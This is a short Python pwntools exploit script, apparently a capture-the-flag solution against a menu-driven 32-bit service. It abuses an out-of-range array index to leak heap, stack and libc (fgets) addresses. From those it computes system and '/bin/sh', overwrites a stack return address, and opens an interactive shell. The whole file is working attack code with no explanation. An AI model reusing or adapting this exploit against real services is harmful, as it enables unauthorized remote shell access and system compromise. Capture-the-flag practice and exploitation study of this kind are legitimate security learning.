#!/usr/bin/env python
from pwn import *
import sys

c = remote(sys.argv[1], int(sys.argv[2]))

c.send("1\n1073741823\n2\n0\n%d\n" % (0x804b02c//4))
c.recvuntil('Existing value is ')
leak_ptr = int(c.recvline())
print "Bugged entry at " + hex(leak_ptr)
c.send("\n2\n0\n%d\n" % ((leak_ptr + 8) / 4))
c.recvuntil('Existing value is ')
stack_ptr = int(c.recvline())
print "Stack ptr is " + hex(stack_ptr)
c.send("\n2\n0\n%d\n" % (0x804afdc / 4))
c.recvuntil('Existing value is ')
fgets = int(c.recvline())
print "fgets is " + hex(fgets)
system = fgets + (0x3cd10 - 0x65810)
sh = fgets + (0x17b8cf - 0x65810)
print "system at " + hex(system)
print "sh at " + hex(sh)
c.send("\n2\n0\n%d\n%d\n%d\n%d\n\n" % ((stack_ptr - 0xc) / 4, system, (stack_ptr - 4) / 4, sh))
c.interactive()
